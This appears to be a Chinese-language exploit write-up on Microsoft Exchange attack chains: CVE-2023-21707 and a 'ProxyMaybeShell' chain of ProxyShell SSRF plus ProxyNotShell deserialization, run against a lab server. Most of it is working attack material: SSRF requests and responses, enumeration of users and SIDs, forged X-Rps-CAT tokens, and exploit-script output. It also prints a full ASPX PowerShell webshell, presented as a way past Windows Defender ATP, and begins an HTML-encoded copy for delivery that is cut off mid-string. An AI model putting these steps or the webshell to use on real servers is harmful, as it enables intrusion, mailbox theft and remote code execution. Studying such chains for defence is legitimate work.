 - ![](pics/CVE-2022-23277-0.png)


# CVE-2023-21707 (反序列化远程代码执行) (暂无域环境)
## CVE-2023-21707 part links

 - [Microsoft Exchange Powershell Remoting Deserialization leading to RCE (CVE-2023-21707) 英语版](https://starlabs.sg/blog/2023/04-microsoft-exchange-powershell-remoting-deserialization-leading-to-rce-cve-2023-21707/)
 - [Microsoft Exchange Powershell Remoting Deserialization lead to RCE (CVE-2023–21707) 越南语原版](https://testbnull.medium.com/microsoft-exchange-powershell-remoting-deserialization-lead-to-rce-cve-2023-21707-4d0e6d282f02)
 - [CVE-2023-21707 Exchange 反序列化payload生成](https://github.com/N1k0la-T/CVE-2023-21707/)

 - 漏洞影响exchange版本信息

``` bash
 < Exchange Server 2019 CU12 Feb23SU	February 14, 2023	15.2.1118.25	15.02.1118.025
 < Exchange Server 2019 CU11 Feb23SU	February 14, 2023	15.2.986.41	15.02.0986.041
 < Exchange Server 2016 CU23 Feb23SU	February 14, 2023	15.1.2507.21	15.01.2507.021
 < Exchange Server 2013 CU23 Feb23SU	February 14, 2023	15.0.1497.47	15.00.1497.047
```

 - ![](./pics/CVE-2023-21707.png)

 - [Proxynotshell 反序列化及 CVE-2023-21707 漏洞研究](https://xz.aliyun.com/t/12634?accounttraceid=97643b6cad1f48a9bc8b9b3016267889gmyp)
 - [Microsoft Exchange Remote Powershell RCE (CVE-2023-21707)](https://www.youtube.com/watch?v=zB-VMAnF82c)

该漏洞为proxynotshell的变体

Microsoft.Exchange.Security.Authentication.GenericSidIdentity是ClaimsIdentity的子类。在反序列化期间，首先重构ClaimsIdentity对象，然后调用ClaimsIdentity.OnDeserializedMethod()

这为漏洞利用提供了机会，可以在第二个反序列化阶段滥用来触发RCE

 - 1. 该exp必须在存在域的内网环境中使用
 - 2. 能访问目标exchange的80(http)和88(Kerberos)端口
 - 3. 需要知道目标机的账号密码

利用 ysoserial.net 生成 ClaimsIdentity 的 BinaryFormatter 的反序列化 payload，再将 payload 的 b64 编码数据通过反射放入 ClaimsIdentity 的 m_serializedClaims 中。也就是 Microsoft.Exchange.Security.Authentication.GenericSidIdentity 的 m_serializedClaims 中，再将这个类通过 BinaryFormatter 进行序列化，将序列化结果写入exception的SerializationData，就得到了可用的 payload

# proxymaybeshell (proxyshell ssrf + proxynotshell伪造X-Rps-CAT token) (completed)
## proxymaybeshell part links

 - [记一次曲折的exchange漏洞利用-ProxyMaybeShell](https://mp.weixin.qq.com/s/mvc-HS1nB2rWzWHLBkYz2A)
 - [7BitsTeam - ProxyMaybeShell](https://github.com/7BitsTeam/ProxyMaybeShell)

 - 说明：proxymaybeshell漏洞是结合proxyshell的ssrf漏洞 + proxynotshell的poc请求powershell端点的NTLM身份认证方式改成了之前proxyshell漏洞中使用的伪造administrator的X-Rps-CAT token方式进行身份认证，且将原proxynotshell的命令执行poc改成了文件写入exp的方式写入shell，适合在不知道目标exchange服务器的账号密码的极端情况下使用，适合实战

 - 漏洞影响exchange版本信息同proxyshell和proxynotshell

## 漏洞复现利用

0. 首先直接使用proxyshell一键写shell的exp发现写失败

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxyshell>python proxyshell-auto.py -t 10.0.102.210
fqdn exchange2016.exchange.lab
+ beizhuan@exchange.lab
legacyDN /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=d0e52d16ed3b48c1902e2a527e8aad4f-beizh
leak_sid S-1-5-21-3005828558-642831567-1133831210-1152
token VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBViZWl6aHVhbkBleGNoYW5nZS5sYWJVLVMtMS01LTIxLTMwMDU4Mjg1NTgtNjQyODMxNTY3LTExMzM4MzEyMTAtMTE1MkcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
set_ews Success with subject kniyztfvzqlbosvg
write webshell at aspnet_client/xscmc.aspx
OUTPUT:

ERROR:
The term 'New-ManagementRoleAssignment' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
OUTPUT:

ERROR:
The term 'Get-MailboxExportRequest' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
OUTPUT:

ERROR:
The term 'New-MailboxExportRequest' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
<Response [404]>
<Response [404]>
<Response [404]>
<Response [404]>
<Response [404]>
write webshell at owa/auth/qnieo.aspx
OUTPUT:

ERROR:
The term 'New-ManagementRoleAssignment' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
```

看响应发现没有导出邮件相关的命令，疑似账户的权限不够：

1. 使用免费在线公开环境

 - [xBitsPlatform使用说明](https://mp.weixin.qq.com/s?__biz=MzkwNjMyNzM1Nw==&mid=2247500069&idx=1&sn=5e06c7b98f9a90cc016e9125b3458e6b&chksm=c0e8a577f79f2c6125ee8971cd2751e831bb7270e096e706a074cf559363d98c902ab3f59c9e&scene=21#wechat_redirect)

访问 https://10.0.102.210 即可

2. 首先从proxyshell入手

经过探测目标仅开放了autodiscover/ews/powershell/mapi等接口，没有owa/ecp等图形界面。

访问autodiscover/ews/powershell/mapi接口，随便输入账号密码然后抓包重放，得到

``` bash
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/10.0
request-id: 6e1ad4de-710c-4725-b955-83a56aa74638
WWW-Authenticate: NTLM TlRMTVNTUAACAAAAEAAQADgAAAAFgomiaqEWKNoKTbAAAAAAAAAAAK4ArgBIAAAACgB8TwAAAA9FAFgAQwBIAEEATgBHAEUAAgAQAEUAWABDAEgAQQBOAEcARQABABgARQBYAEMASABBAE4ARwBFADIAMAAxADYABAAYAGUAeABjAGgAYQBuAGcAZQAuAGwAYQBiAAMAMgBlAHgAYwBoAGEAbgBnAGUAMgAwADEANgAuAGUAeABjAGgAYQBuAGcAZQAuAGwAYQBiAAUAGABlAHgAYwBoAGEAbgBnAGUALgBsAGEAYgAHAAgAAhw2dN7p2QEAAAAA
WWW-Authenticate: Negotiate
X-Powered-By: ASP.NET
X-FEServer: EXCHANGE2016
WWW-Authenticate: Basic realm="10.0.102.210"
Date: Mon, 18 Sep 2023 03:16:02 GMT
Connection: close
Content-Length: 0
```

 - ![](./pics/proxymaybeshell.png)

通过autodiscover接口的ntlm认证信息获取内网域名等信息：

``` bash
exchange.lab
```

3. 获取内置用户的dn

安装了exchange的域会包含几个内置账户，可以尝试获取他们的dn：

``` bash
Administrator
SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}
FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
Migration.8f3e7716-2011-43e4-96b1-aba62d229136
SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
```

但在此环境中，均爆破失败

 - [proxyshell-enumerate.py](https://github.com/dmaasland/proxyshell-poc/blob/main/proxyshell-enumerate.py)，使用ews接口的功能获取到邮箱列表，默认情况下会获得列表：

 - request

``` bash
POST /autodiscover/autodiscover.json?@evil.corp/EWS/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp HTTP/1.1
Host: 10.0.102.210
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: text/xml
Content-Length: 569

<soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
  </soap:Header>
 <soap:Body>
    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
      <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
    </m:ResolveNames>
  </soap:Body>
</soap:Envelope>
```

 - response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/xml; charset=utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 8d123af2-3b41-4926-b948-6915c5ed3c7d
X-CalculatedBETarget: exchange2016.exchange.lab
X-DiagInfo: EXCHANGE2016
X-BEServer: EXCHANGE2016
X-AspNet-Version: 4.0.30319
Set-Cookie: exchangecookie=52c52ff0f51147d6aa9721222a58b5b6; expires=Wed, 18-Sep-2024 08:13:16 GMT; path=/; HttpOnly
Set-Cookie: X-BackEndCookie=; expires=Sat, 18-Sep-1993 08:13:16 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: EXCHANGE2016
Date: Mon, 18 Sep 2023 08:13:16 GMT
Connection: close
Content-Length: 4531

<?xml version="1.0" encoding="utf-8"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Header><h:ServerVersionInfo MajorVersion="15" MinorVersion="2" MajorBuildNumber="721" MinorBuildNumber="2" Version="V2017_07_11" xmlns:h="http://schemas.microsoft.com/exchange/services/2006/types" xmlns="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></s:Header><s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><m:ResolveNamesResponse xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><m:ResponseMessages><m:ResolveNamesResponseMessage ResponseClass="Success"><m:ResponseCode>NoError</m:ResponseCode><m:ResolutionSet TotalItemsInView="4" IncludesLastItemInRange="true"><t:Resolution><t:Mailbox><t:Name>beizhuan</t:Name><t:EmailAddress>beizhuan@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>beizhuan</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:beizhuan@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution><t:Resolution><t:Mailbox><t:Name>dashe</t:Name><t:EmailAddress>dashe@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>dashe</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:dashe@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution><t:Resolution><t:Mailbox><t:Name>weizi</t:Name><t:EmailAddress>weizi@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>weizi</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:weizi@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution><t:Resolution><t:Mailbox><t:Name>yeshen</t:Name><t:EmailAddress>yeshen@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>yeshen</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:yeshen@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution></m:ResolutionSet></m:ResolveNamesResponseMessage></m:ResponseMessages></m:ResolveNamesResponse></s:Body></s:Envelope>
```

在此响应包中同样发现了exchange版本信息, [Exchange Server build numbers and release dates](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019)

``` bash
===> ServerVersionInfo MajorVersion="15" MinorVersion="2" MajorBuildNumber="721" MinorBuildNumber="2" Version="V2017_07_11"
===> 15.2.721.2
===> Exchange Server 2019 CU7	September 15, 2020	15.2.721.2	15.02.0721.002
```

通过邮箱获取到dn：

``` bash
POST /autodiscover/autodiscover.json?a=ictbv@pshke.pov/autodiscover/autodiscover.xml HTTP/1.1
Host: 10.0.102.210
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: Email=autodiscover/autodiscover.json?a=ictbv@pshke.pov
Content-Type: text/xml
Content-Length: 354

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
					<Request>
					  <EMailAddress>beizhuan@exchange.lab</EMailAddress>
					  <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
					</Request>
				</Autodiscover>
```

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/xml; charset=utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 86edc523-c146-4c29-a133-0306b2036eb2
X-CalculatedBETarget: exchange2016.exchange.lab
X-DiagInfo: EXCHANGE2016
X-BEServer: EXCHANGE2016
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=; expires=Sat, 18-Sep-1993 08:11:28 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: EXCHANGE2016
Date: Mon, 18 Sep 2023 08:11:28 GMT
Connection: close
Content-Length: 3823

<?xml version="1.0" encoding="utf-8"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006">
  <Response xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <User>
      <DisplayName>beizhuan</DisplayName>
      <LegacyDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=d0e52d16ed3b48c1902e2a527e8aad4f-beizh</LegacyDN>
      <AutoDiscoverSMTPAddress>beizhuan@exchange.lab</AutoDiscoverSMTPAddress>
      <DeploymentId>c01270f4-b14e-4b5c-80ca-5bf9bcf624e2</DeploymentId>
    </User>
    <Account>
      <AccountType>email</AccountType>
      <Action>settings</Action>
      <MicrosoftOnline>False</MicrosoftOnline>
      <Protocol>
        <Type>EXCH</Type>
        <Server>9662229a-96fd-45ec-af46-c8e8503ef227@exchange.lab</Server>
        <ServerDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=9662229a-96fd-45ec-af46-c8e8503ef227@exchange.lab</ServerDN>
        <ServerVersion>73C282D1</ServerVersion>
        <MdbDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=9662229a-96fd-45ec-af46-c8e8503ef227@exchange.lab/cn=Microsoft Private MDB</MdbDN>
        <PublicFolderServer>exchange2016.exchange.lab</PublicFolderServer>
        <AD>dc.exchange.lab</AD>
        <ASUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</ASUrl>
        <EwsUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</EwsUrl>
        <EmwsUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</EmwsUrl>
        <EcpUrl>https://exchange2016.exchange.lab/owa/</EcpUrl>
        <EcpUrl-um>?path=/options/callanswering</EcpUrl-um>
        <EcpUrl-aggr>?path=/options/connectedaccounts</EcpUrl-aggr>
        <EcpUrl-mt>options/ecp/PersonalSettings/DeliveryReport.aspx?rfr=olk&amp;exsvurl=1&amp;IsOWA=&lt;IsOWA&gt;&amp;MsgID=&lt;MsgID&gt;&amp;Mbx=&lt;Mbx&gt;</EcpUrl-mt>
        <EcpUrl-ret>?path=/options/retentionpolicies</EcpUrl-ret>
        <EcpUrl-sms>?path=/options/textmessaging</EcpUrl-sms>
        <EcpUrl-photo>?path=/options/myaccount/action/photo</EcpUrl-photo>
        <EcpUrl-tm>options/ecp/?rfr=olk&amp;ftr=TeamMailbox&amp;exsvurl=1</EcpUrl-tm>
        <EcpUrl-tmCreating>options/ecp/?rfr=olk&amp;ftr=TeamMailboxCreating&amp;SPUrl=&lt;SPUrl&gt;&amp;Title=&lt;Title&gt;&amp;SPTMAppUrl=&lt;SPTMAppUrl&gt;&amp;exsvurl=1</EcpUrl-tmCreating>
        <EcpUrl-tmEditing>options/ecp/?rfr=olk&amp;ftr=TeamMailboxEditing&amp;Id=&lt;Id&gt;&amp;exsvurl=1</EcpUrl-tmEditing>
        <EcpUrl-extinstall>?path=/options/manageapps</EcpUrl-extinstall>
        <OOFUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</OOFUrl>
        <UMUrl>https://exchange2016.exchange.lab/EWS/UM2007Legacy.asmx</UMUrl>
        <OABUrl>https://exchange2016.exchange.lab/OAB/5356a7f1-86d2-4ad6-868d-623c9fad6d08/</OABUrl>
        <ServerExclusiveConnect>off</ServerExclusiveConnect>
      </Protocol>
      <Protocol>
        <Type>EXPR</Type>
        <Server>exchange2016.exchange.lab</Server>
        <SSL>Off</SSL>
        <AuthPackage>Ntlm</AuthPackage>
        <ServerExclusiveConnect>on</ServerExclusiveConnect>
        <CertPrincipalName>None</CertPrincipalName>
        <GroupingInformation>Default-First-Site-Name</GroupingInformation>
      </Protocol>
      <Protocol>
        <Type>WEB</Type>
        <Internal>
          <OWAUrl AuthenticationMethod="Basic, Fba">https://exchange2016.exchange.lab/owa/</OWAUrl>
          <Protocol>
            <Type>EXCH</Type>
            <ASUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</ASUrl>
          </Protocol>
        </Internal>
      </Protocol>
    </Account>
  </Response>
</Autodiscover>
```

4. 获取sid

此mapi接口从CVE-2018-8581就已经被利用，当有账户dn的时候可以获取到sid：

 - [自写脚本 getsid.py](./proxymaybeshell/ProxyMaybeShell-main/getsid.py)

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python getsid.py
[+] SID:  S-1-5-21-3005828558-642831567-1133831210-500
```

5. 伪造powershell接口token X-Rps-CAT参数

powershell接口的判断用户身份是依赖于X-Rps-CAT参数，主要通过里面包含的sid判断身份：

 - [proxyshellwithsid.py](./proxymaybeshell/ProxyMaybeShell-main/proxyshellwithsid.py)

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python proxyshellwithsid.py -u https://10.0.102.210 -s S-1-5-21-3005828558-642831567-1133831210-500
Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
```

6. 遍历sid

发现Administrator用户的权限很低：

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python proxyshellwithsid.py -u https://10.0.102.210 -s S-1-5-21-3005828558-642831567-1133831210-500
Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
PS> get-command127.0.0.1 - - [18/Sep/2023 14:59:06] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:07] "POST /wsman HTTP/1.1" 200 -127.0.0.1 - - [18/Sep/2023 14:59:07] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:08] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:08] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:09] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:10] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:10] "POST /wsman HTTP/1.1" 200 -
OUTPUT:
Get-Command
Get-Help
Get-Mailbox
Get-MailboxExportRequest
Get-MailboxExportRequestStatistics
Get-MailboxImportRequest
Get-MailboxImportRequestStatistics
Get-Notification
Get-RecoverableItems
Get-UnifiedAuditSetting
New-MailboxExportRequest
New-MailboxImportRequest
Remove-MailboxExportRequest
Remove-MailboxImportRequest
Restore-RecoverableItems
Resume-MailboxExportRequest
Resume-MailboxImportRequest
Search-Mailbox
Set-ADServerSettings
Set-MailboxExportRequest
Set-MailboxImportRequest
Set-Notification
Set-UnifiedAuditSetting
Start-AuditAssistant
Suspend-MailboxExportRequest
Suspend-MailboxImportRequest
Write-AdminAuditLog
Exit-PSSession
Get-FormatData
Measure-Object
Out-Default
Select-Object
```

可以遍历sid直至找到支持New-MailboxExportRequest的账户，但在这个环境一系列尝试后无果。使用getmailbox获取到的所有账户也没有高权限的：

``` bash
PS> get-mailbox
127.0.0.1 - - [18/Sep/2023 15:00:12] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:12] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:13] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:13] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:15] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:16] "POST /wsman HTTP/1.1" 200 -
OUTPUT:
发现搜索邮箱
BitsAdmin
weizi
dashe
beizhuan
yeshen
```

7. SSRF2RCE

proxyshell是没法利用了。但存在的ssrf还是可以使用的

通过之前的响应包，发现该exchange版本为15.2.721.2，版本比较老旧，不受CVE-2021–42321,CVE-2022-23277等漏洞影响，相比较之下比较新的漏洞ProxyNotShell影响范围更广一些

原始脚本直接使用账户密码NTLM认证，再利用反序列化漏洞进行攻击，这里需要修改成使用ssrf漏洞结合X-Rps-CAT绕过认证的形式

其中X-Rps-CAT可以使用[proxyshellwithsid.py](./proxymaybeshell/ProxyMaybeShell-main/proxyshellwithsid.py)这个脚本获取

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python proxyshellwithsid.py -u https://10.0.102.210 -s S-1-5-21-3005828558-642831567-1133831210-500
Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
```

9. ReSSRF

填入[proxynotshellcmd.py](./proxymaybeshell/ProxyMaybeShell-main/proxynotshellcmd.py)这个脚本后进行rce，这里遇到一个命令执行没回显的经典问题。目标是不出网的，包括dns。只能写入文件，但该环境无法访问常规的exchange放webshell的目录，如owa/ecp/aspnet_client等。而autodiscover等目录虽然可以访问，但需要凭据。联系前面的内容我们很容易想到通过ssrf绕过autodiscover的认证，简单写一个探测脚本：

 - [ssrf-Autodiscover.py](./proxymaybeshell/ProxyMaybeShell-main/ssrf-Autodiscover.py)

多次尝试后发现无法成功写入。尝试了多个可能问题，包括命令的转义等情况，最后得出结论可能是被目标杀软拦截了。

10. proxynotshell反序列化利用写文件

修改poc后写入使用[proxynotshellfileWrite.py](./proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py)访问，写入之前的proxyshell的普通aspx一句话shell成功但会报编译错误

11. bypass windows definder ATP

查看目录可以发现存在较新的windows definder atp，使用[POWERshell.aspx](https://github.com/ThePacketBender/webshells/blob/master/POWERshell.aspx)可以通过调用c# powershell相关的dll绕过definder部分限制。在这个漏洞利用的情境下使用控件表单的webshell非常麻烦，稍微修改一下webshell：

``` bash
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Collections.ObjectModel"%>
<%@ Import Namespace="System.Management.Automation"%>
<%@ Import Namespace="System.Management.Automation.Runspaces"%>
<%@ Assembly Name="System.Management.Automation,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31BF3856AD364E35"%>
<!DOCTYPE html>
<script Language="c#" runat="server">
    private static string powershelled(string scriptText)
    {
        try
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(scriptText);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
                stringBuilder.AppendLine(obj.ToString());
            return stringBuilder.ToString();
        }catch(Exception exception)
        {
            return string.Format("Error: {0}", exception.Message);
        }
    }
    protected void Page_Load(object sender, EventArgs e)
    {
       Response.Write(powershelled(Request.Params["cmd"]));
    }
</script>
```

转义为html编码:

``` bash
&#x3c;&#x25;&#x40;&#x20;&#x50;&#x61;&#x67;&#x65;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x43;&#x23;&#x22;&#x20;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x2e;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x4d;&#x6f;&#x64;&#x65;&#x6c;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x73;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x41;